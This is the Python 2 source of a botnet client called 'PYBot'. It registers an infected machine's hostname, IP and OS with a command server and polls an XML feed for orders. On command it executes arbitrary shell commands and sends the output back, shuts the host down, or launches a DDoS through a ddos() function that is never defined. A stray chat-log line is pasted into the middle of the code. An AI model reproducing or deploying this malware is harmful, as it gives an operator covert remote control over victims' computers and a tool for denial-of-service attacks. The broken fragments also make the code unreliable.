#d3v1nc3

import os
import socket
import time
import platform
import httplib
import urllib
import hashlib
import os.path
import commands
import subprocess
from xml.dom import minidom

token = str("93d664ea1f46b3b006e9da3c89c520d8")
name_pc = socket.gethostname()
ip_intern = socket.gethostbyname(name_pc)
os_type = platform.platform()
personal_token = hashlib.md5(os.urandom(128)).hexdigest()
file_registered = "infected"
server_xml = "http://localhost/data/cmd.xml"

def ifregistered():
  #file_stat = os.path.isfile(file_registered)
  ##if os.path.isfile(file_registered) == True:
  ##  readfile = open(file_registered, 'r')
  ##  line = readfile.readline()
  ##  readfile.close()
  ##else:
  newfile = open(file_registered, 'w')
  newfile.write(personal_token)
  newfile.close()

def read_token():
  global value_file_token
  filename_infected = "infected"
  file = open(filename_infected, 'r')
  value_file_token = file.readline()
  file.close()

def register():
  param = urllib.urlencode({'token': token,'name_pc': name_pc,'ip_interna': ip_intern,'os_type': os_type, 'personal_token': personal_token})
  headers = {"Content-type": "application/x-www-form-urlencoded","Accept": "text/plain"}
  abrir_conexion = httplib.HTTPConnection("localhost:80")
  abrir_conexion.request("POST", "/pybot/register.php", param, headers)

def send_cmd_result(cmd_result):
  param = urllib.urlencode({'token': value_file_token, 'result': cmd_result})
  headers = {"Content-type": "application/x-www-form-urlencoded","Accept": "text/plain"}
  abrir_conexion = httplib.HTTPConnection("localhost:80")
  abrir_conexion.request("POST", "/pybot/getcmd.php", param, headers)

def shutdown_now():
  subprocess.call("shutdown -h now", shell=True)


def main():
  global last_id
  last_id = 1
  while True:
    try:
      response = urllib.urlopen(server_xml)
      xmldata = response.read()
      xmldoc = minidom.parseString(xmldata)
      reflist = xmldoc.getElementsByTagName("victim")[0]
      all_option = reflist.getAttribute("all")
      reflist_id = xmldoc.getElementsByTagName("id")[0]
      first_id = reflist_id.firstChild.nodeValue
      if first_id != last_id:
        if all_option == "false":
          reflist_token = xmldoc.getElementsByTagName("personaltoken")[0]
          pers_token = reflist_token.firstChild.nodeValue
          read_token()
          ##print value_file_token
          if pers_token == value_file_token:
            reflist_option = xmldoc.getElementsByTagName("option")[0]
            self_option = reflist_option.firstChild.nodeValue
            ##global last_id
            if self_option == "1":
              reflist_cmd = xmldoc.getElementsByTagName("command")[0]
              self_command = reflist_cmd.firstChild.nodeValue
              cmd_result = commands.getoutput(self_command)
              ##print cmd_result
              send_cmd_result(cmd_result)
              ##global last_id
              last_id = first_id
              ##time.sleep(7)
            elif self_option == "2":
              shutdown_now()
              ##global last_id
              last_id = first_id
              ##time.sleep(7)
            elif self_option == "3":
              reflist_msg = xmldoc.getElementsByTagName("message")[0]
              self_msg = reflist_msg.firstChild.nodeValue
              print str(self_msg + "\n")
              ##global last_id
              last_id = first_id
              ##time.sleep(7)
        else:
          reflist_token_2 = xmldoc.getElementsByTagName("privtoken")[0]
          priv_token = reflist_token_2.firstChild.nodeValue
          if priv_token == token:
            reflist_option_2 = xmldoc.getElementsByTagName("option")[0]
            self_option_2 = reflist_option_2.firstChild.nodeValue
            if self_option_2 == "4":
              reflist_url_2 = xmldoc.getElementsByTagName("url")[0]
              self_url_2 = reflist_url_2.firstChild.nodeValue
              ddos(self_url_2)
              ##time.sleep(7)
    except:
      print "OH NO AN ERROR!\n"
      pass
      ##time.sleep(15)

Marquitws, [02.02.17 11:04]


if __name__ == "__main__":
  
  if os.path.isfile(file_registered) == True:
    print "PYBot Already Registered!!"
    print "\n"
    main()
  else:
    ifregistered()
    register()
    main()